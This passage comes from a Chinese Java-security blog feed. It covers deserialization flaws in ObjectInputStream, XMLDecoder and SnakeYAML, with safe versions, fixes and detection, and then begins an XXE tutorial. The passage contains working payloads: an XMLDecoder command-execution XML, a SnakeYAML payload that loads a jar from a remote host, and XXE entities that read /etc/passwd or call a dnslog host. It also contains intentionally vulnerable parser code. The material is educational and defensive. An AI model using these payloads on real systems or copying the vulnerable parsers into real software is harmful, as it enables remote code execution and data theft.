</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">cc</span>(String base64) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        base64 <span style="color:#f92672">=</span> base64.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#34; &#34;</span>, <span style="color:#e6db74">&#34;+&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">getDecoder</span>().<span style="color:#a6e22e">decode</span>(base64);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ByteArrayInputStream stream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(bytes);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反序列化流，将序列化的原始数据恢复为对象</span>
</span></span><span style="display:flex;"><span>        ObjectInputStream in <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(stream);
</span></span><span style="display:flex;"><span>        in.<span style="color:#a6e22e">readObject</span>();
</span></span><span style="display:flex;"><span>        in.<span style="color:#a6e22e">close</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;反序列化漏洞&#34;</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> e.<span style="color:#a6e22e">toString</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>ObjectInputStream.readObject,将对象给恢复,调用恢复对象的readObject方法,执行命令
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_1.png" alt="|600"  /></p>
<h4 id="xmldecoder">XMLDecoder</h4>
<p>也是一样的,只不过是换成了xmldecode.readObject</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// XMLDecoder在JDK 1.4~JDK 11中都存在反序列化漏洞安全风险。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。在项目中应禁止使用XMLDecoder方式解析XML内容</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>String path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;src/main/resources/payload/calc-1.xml&#34;</span>;
</span></span><span style="display:flex;"><span>File file <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(path);
</span></span><span style="display:flex;"><span>FileInputStream fis <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>    fis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileInputStream(file);
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>    e.<span style="color:#a6e22e">printStackTrace</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BufferedInputStream bis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BufferedInputStream(fis);
</span></span><span style="display:flex;"><span>XMLDecoder xmlDecoder <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> XMLDecoder(bis);
</span></span><span style="display:flex;"><span>xmlDecoder.<span style="color:#a6e22e">readObject</span>();
</span></span><span style="display:flex;"><span>xmlDecoder.<span style="color:#a6e22e">close</span>();
</span></span></code></pre></div><p>传输的数据是xml格式</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;java</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.8.0_151&#34;</span> <span style="color:#a6e22e">class=</span><span style="color:#e6db74">&#34;java.beans.XMLDecoder&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;object</span> <span style="color:#a6e22e">class=</span><span style="color:#e6db74">&#34;java.lang.ProcessBuilder&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;array</span> <span style="color:#a6e22e">class=</span><span style="color:#e6db74">&#34;java.lang.String&#34;</span> <span style="color:#a6e22e">length=</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;void</span> <span style="color:#a6e22e">index=</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;string&gt;</span>cmd<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;/void&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;void</span> <span style="color:#a6e22e">index=</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;string&gt;</span>/c<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;/void&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;void</span> <span style="color:#a6e22e">index=</span><span style="color:#e6db74">&#34;2&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;string&gt;</span>calc<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;/void&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/array&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;void</span> <span style="color:#a6e22e">method=</span><span style="color:#e6db74">&#34;start&#34;</span> <span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/object&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/java&gt;</span>
</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_2.png" alt=""  /></p>
<h4 id="snakeyaml">SnakeYaml</h4>
<p>SnakeYAML 反序列化,
SnakeYAML 在反序列化时可以指定 class 类型和构造方法的参数,
结合 JDK 自带的 javax.script.ScriptEngineManager 类，可实现加载远程 jar 包，完成任意代码执行.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 远程服务器支持用户可以输入yaml格式的内容并且进行数据解析，没有做沙箱，黑名单之类的防控</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">yaml</span>(String content) {
</span></span><span style="display:flex;"><span>    Yaml y <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Yaml();
</span></span><span style="display:flex;"><span>    y.<span style="color:#a6e22e">load</span>(content);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>只不过传输的数据不是object格式了,而是yaml格式
使用了<a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener nofollow noreferrer" >yaml-payload</a>这个工具,编译得到一个payload.jar,放在wsl里面,并且开一个web服务器.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#75715e">!!javax.script.ScriptEngineManager</span> [
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">!!java.net.URLClassLoader</span> [[
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">!!java.net.URL</span> [<span style="color:#e6db74">&#34;http://192.168.10.7:8000/yaml-payload.jar&#34;</span>]
</span></span><span style="display:flex;"><span>  ]]
</span></span><span style="display:flex;"><span>]
</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_3.png" alt=""  /></p>
<h3 id="安全代码">安全代码</h3>
<h4 id="黑白名单">黑白名单</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 使用Apache Commons IO的ValidatingObjectInputStream，accept方法来实现反序列化类白/黑名单控制</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">safe</span>(String base64) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        base64 <span style="color:#f92672">=</span> base64.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#34; &#34;</span>, <span style="color:#e6db74">&#34;+&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">getDecoder</span>().<span style="color:#a6e22e">decode</span>(base64);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ByteArrayInputStream stream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(bytes);
</span></span><span style="display:flex;"><span>        ValidatingObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ValidatingObjectInputStream(stream);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 只允许反序列化Student class</span>
</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">accept</span>(Student.<span style="color:#a6e22e">class</span>);
</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">readObject</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;ValidatingObjectInputStream&#34;</span>;
</span></span><span style="display:flex;"><span>     } <span style="color:#66d9ef">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> e.<span style="color:#a6e22e">toString</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h4 id="snakeyaml安全构造器">SnakeYaml安全构造器</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// SafeConstructor 是 SnakeYaml 提供的一个安全的构造器。它可以用来构造安全的对象，避免反序列化漏洞的发生。</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">safe</span>(String content) {
</span></span><span style="display:flex;"><span>    Yaml y <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Yaml(<span style="color:#66d9ef">new</span> SafeConstructor());
</span></span><span style="display:flex;"><span>    y.<span style="color:#a6e22e">load</span>(content);
</span></span><span style="display:flex;"><span>    log.<span style="color:#a6e22e">info</span>(<span style="color:#e6db74">&#34;[safe] SnakeYaml反序列化: &#34;</span> <span style="color:#f92672">+</span> content);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="漏洞修复">漏洞修复</h2>
<ol>
<li>更新commons-collections、commons-io等第三方库版本。</li>
<li>不要使用可以执行任意代码的类型进行反序列化。例如，不要使用 ObjectInputStream.readObject 方法进行反序列化，而应该使用安全的反序列化方法，例如 ObjectInputStream.readUnshared 方法。</li>
<li>对于来源不可信的序列化数据，不要直接进行反序列化，而应该先进行校验，确保它不存在恶意代码。例如，可以对序列化数据的长度、格式进行校验，避免反序列化漏洞的发生。</li>
</ol>
<h2 id="漏洞发现">漏洞发现</h2>
<p>黑盒发现（流量捕获）
白盒发现（特征类接口函数）</p>
<h3 id="白盒">白盒</h3>
<p>看是否用到了这些库,以及上面那些函数吧
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_4.png" alt=""  /></p>
<h3 id="黑盒">黑盒</h3>
<p>黑盒的话看流量,看特征码
java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特征为rO0AB，</p>
<p>burp插件
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_5.png" alt="|600"  /></p>
<p>需要配置一下ysoserial(一款java反序列化漏洞payload生成器)的路径</p>
<h1 id="一句话总结">一句话总结</h1>
<p>反序列化时会调用被反序列化对象的readObject方法,当这个方法被重写后,就会导致漏洞产生</p>
<h1 id="参考">参考</h1>
<p><a href="https://www.freebuf.com/articles/web/333697.html" target="_blank" rel="noopener nofollow noreferrer" >Java反序列化基础篇-01-反序列化概念与利用 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://www.cnblogs.com/piaomiaohongchen/p/16447244.html" target="_blank" rel="noopener nofollow noreferrer" >java反序列化漏洞专项 - 飘渺红尘✨ - 博客园</a></p>
<p><a href="https://xz.aliyun.com/t/13060?time__1311=GqmhBK4GxRhx%2FWNiQo40IFqWuxiw5pD" target="_blank" rel="noopener nofollow noreferrer" >JAVA安全-序列化与反序列化基础详解</a></p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/sec/javasec" term="sec/javasec" label="sec/javasec" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[javasec-xxe]]></title>
            <link href="https://l1uyun.one/posts/javasec-xxe/" rel="alternate" type="text/html" />
            
                <id>https://l1uyun.one/posts/javasec-xxe/</id>
            
            
            <published>2024-07-26T18:10:32+08:00</published>
            <updated>2024-08-18T10:06:17+08:00</updated>
            
            
            <content type="html"><![CDATA[<h1 id="xxe注入">xxe注入</h1>
<h2 id="前置知识">前置知识</h2>
<h3 id="xml文档">XML文档</h3>
<p>要了解XXE漏洞，那么先得了解一下有关XML的基础知识。</p>
<p>XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，&hellip;），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，&hellip;）</p>
<h4 id="文档结构">文档结构</h4>
<p>XML主要由7个部分组成,</p>
<ul>
<li>文档声明</li>
<li>标签/元素</li>
<li>属性</li>
<li>注释</li>
<li>实体字符</li>
<li>CDATA 字符数据区。CDATA 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data）。CDATA 部分中的所有内容都会被解析器忽略。CDATA 部分由 <code>**</code> 结束，某些文本比如 JavaScript 代码，包含大量 “&lt;” 或 “&amp;” 字符。为了避免错误，可以将脚本代码定义为 CDATA。</li>
<li>处理指令,</li>
</ul>
<p>一个标准的xml文件为</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- XML文档声明；同时也是一个处理指令,用于声明 XML 文档的版本和编码方式。&lt;? xxx ?&gt; 就是处理指令的格式--&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- bookstore根元素、book子元素--&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;bookstore&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- category、lang都是属性--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;book</span> <span style="color:#a6e22e">category=</span><span style="color:#e6db74">&#34;COOKING&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;title</span> <span style="color:#a6e22e">lang=</span><span style="color:#e6db74">&#34;en&#34;</span><span style="color:#f92672">&gt;</span>Everyday Italian<span style="color:#f92672">&lt;/title&gt;</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">&lt;!-- &amp;lt;实体字符 是一个预定义的实体引用，这里也可以引用dtd中定义的实体，以 &amp; 开头, 以;结尾--&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;author&gt;</span>Giada De Laurentiis&amp;lt;<span style="color:#f92672">&lt;/author&gt;</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;year&gt;</span>2005<span style="color:#f92672">&lt;/year&gt;</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;price&gt;</span>30.00<span style="color:#f92672">&lt;/price&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">&lt;!-- script这里是CDATA，不能被xml解析器解析，可以被JavaScript解析--&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;script&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">&lt;![CDATA[
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   function matchwo(a,b)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   {
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    if (a &lt; b &amp;&amp; a &lt; 0) then
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      {return 1;}
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    else
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      {return 0;}
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   }
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   ]]&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/script&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/book&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/bookstore&gt;</span>
</span></span></code></pre></div><h4 id="dtd">DTD</h4>
<p>DTD（Document Type Definition）是用来定义 XML 文档的结构和合法元素的集合。
DTD 定义了 XML 文档中可以出现的元素、属性和它们的顺序，以确保 XML 数据的格式和结构符合预定义的规则。
DTD 可以嵌入到 XML 文档中，也可以外部定义并引用。</p>
<p>DOCTYPE是DTD的声明
!ELEMENT&gt; 声明用于定义 XML 文档中元素的结构和内容模型。它指定了元素的名称及其允许的子元素、文本内容或其他结构。
ENTITY是实体的声明，所谓实体可以理解为变量
SYSTEM、PUBLIC是外部资源的申请</p>
<p>从两个角度可以把XML分为两类共4个类型：</p>
<p>（内部实体、外部实体）</p>
<p>（通用实体、参数实体）</p>
<p>1)内部实体
所谓内部实体是指在一个实体中定义的另一个实体，也就是嵌套定义。
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_1.png" alt=""  />
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_2.png" alt=""  />
使用&amp;xxe对上面定义的xxe实体进行了引用，到时候输出的时候&amp;xxe就会被“test”替换。</p>
<p>在XML内部声明DTD:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE note [
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!ELEMENT to      (#PCDATA)&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!ELEMENT from    (#PCDATA)&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!ELEMENT message (#PCDATA)&gt;</span>
</span></span><span style="display:flex;"><span>]&gt;
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;note&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;to&gt;</span>George<span style="color:#f92672">&lt;/to&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;from&gt;</span>John<span style="color:#f92672">&lt;/from&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;message&gt;</span>Reminder<span style="color:#f92672">&lt;/message&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/note&gt;</span>
</span></span></code></pre></div><p>2）外部实体
外部实体表示外部文件的内容，用 SYSTEM 关键词表示，通常使用下面的格式来引用</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY entityName SYSTEM &#34;fileName&#34;&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY example SYSTEM &#34;/etc/passwd&#34;&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY entityName PUBLIC &#34;publicID&#34; &#34;fileName&#34;&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY example PUBLIC &#34;-//W3C//DTD HTML 4.01 Transitional//EN&#34; &#34;html4-transitional.dtd&#34;&gt;</span>
</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_3.png" alt=""  />
有些XML文档包含system标识符定义的“实体”，这些文档会在DOCTYPE头部标签中呈现。这些定义的’实体’能够访问本地或者远程的内容。
假如 SYSTEM 后面的内容可以被攻击者控制，那么攻击者就可以随意替换为其他内容，从而读取服务器本地文件（file:///etc/passwd）或者远程文件（http://www.baidu.com/abc.txt）。</p>
<p>3）通用实体
用”&amp;实体名“引用的实体，在DTD中定义，在XML文档中引用。
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_4.png" alt=""  /></p>
<p>4）参数实体
使用<code>% 实体名</code>（这里空格不能少）在 DTD 中定义，并且只能在 DTD 中使用<code>%实体名;</code>引用
只有在DTD文件中，参数实体的声明才能引用其他实体
和通用实体一样，参数实体也可以外部引用
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_5.png" alt=""  /></p>
<h3 id="xxe">XXE</h3>
<p>XXE（XML External Entity Injection，XML 外部实体注入）是一种安全漏洞，通常发生在解析 XML 数据时。攻击者通过在 XML 文档中注入外部实体来读取本地文件、发送数据到远程服务器，甚至执行其他恶意操作。
XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全问题。</p>
<p>XXE漏洞之所以名为外部实体漏洞，就是因为问题主要出自于外部资源的申请以及外部实体的引用这部分特性中。我们从XXE的全称（XML外部实体注入）可以看出，XXE也是一种XML注入，只不过注入的是XML外部实体罢了。
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_6.png" alt="|500"  /></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &lt;!ELEMENT foo ANY &gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>]&gt;<span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
</span></span></code></pre></div><p>在这个示例中，<code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt; </code>定义了一个外部实体 xxe，指向本地文件 /etc/passwd。
当 XML 解析器解析这个 XML 数据时，它会尝试读取 /etc/passwd 文件的内容并将其插入到 <foo>&amp;xxe;</foo> 标签中。</p>
<h3 id="java-解析xml的四种方式">Java 解析XML的四种方式</h3>
<ol>
<li>
<p>DOM（Document Object Model）解析</p>
<ul>
<li>DocumentBuilder: 用于解析 XML 数据并构建 DOM 文档对象模型。属于 JAXP（Java API for XML Processing）。</li>
<li>DOMParser: 一般指 DOM 解析器的实现（如 org.w3c.dom.DocumentBuilder）。它用于将 XML 数据解析成 DOM 文档结构。</li>
</ul>
</li>
<li>
<p>SAX（Simple API for XML）解析</p>
<ul>
<li>SAXParser: SAX 解析器，用于逐行读取 XML 数据，并触发相应的事件。属于 JAXP（Java API for XML Processing）。</li>
<li>Unmarshaller: JAXB 中的组件，用于将 XML 数据转换为 Java 对象。虽然它在 JAXB 中不直接属于 SAX，但它可以配置 SAX 解析器来处理 XML 数据。</li>
</ul>
</li>
<li>
<p>JDOM 解析</p>
<ul>
<li>SAXBuilder: JDOM 提供的一个类，用于通过 SAX 解析器构建 JDOM 文档对象模型。JDOM 是一个独立的 XML 处理库，与 DOM4J 和 JAXB 不同。</li>
</ul>
</li>
<li>
<p>DOM4J（Document Object Model for Java）解析</p>
<ul>
<li>SAXReader: DOM4J 提供的一个类，用于使用 SAX 解析 XML 数据。实际上，SAXReader 是 DOM4J 的一部分，而不是独立的 SAX 解析器。</li>
</ul>
</li>
</ol>
<h2 id="复现平台">复现平台</h2>
<p><a href="https://github.com/j3ers3/Hello-Java-Sec" target="_blank" rel="noopener nofollow noreferrer" >Hello-Java-Sec</a>
<a href="https://github.com/bewhale/JavaSec" target="_blank" rel="noopener nofollow noreferrer" >JavaSec</a></p>
<h2 id="漏洞分析">漏洞分析</h2>
<p>按照这两个平台提供的资源,来看看具体产生漏洞的代码.</p>
<h3 id="xmlreader">XMLReader</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * XMLReader 是一个接口，用于解析 XML 文档。它是 SAX (Simple API for XML) 的核心组件之一。
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 它提供了对 XML 文档的逐行读取和解析功能，并将事件传递给相应的处理器。
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 使用 XMLReader 时，需要注意安全问题，例如防止 XML 外部实体注入攻击。
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">// payload: &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &#34;dsm6kqkg.dnslog.pw&#34;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">XMLReader</span>(<span style="color:#a6e22e">@RequestBody</span> String content) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        XMLReader xmlReader <span style="color:#f92672">=</span> XMLReaderFactory.<span style="color:#a6e22e">createXMLReader</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 修复：禁用外部实体</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// xmlReader.setFeature(&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;, true);</span>
</span></span><span style="display:flex;"><span>        xmlReader.<span style="color:#a6e22e">parse</span>(<span style="color:#66d9ef">new</span> InputSource(<span style="color:#66d9ef">new</span> StringReader(content)));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;XMLReader XXE&#34;</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> e.<span style="color:#a6e22e">toString</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_2.png" alt=""  />
修复方法就是上面代码中的,setFeature,禁用外部实体</p>
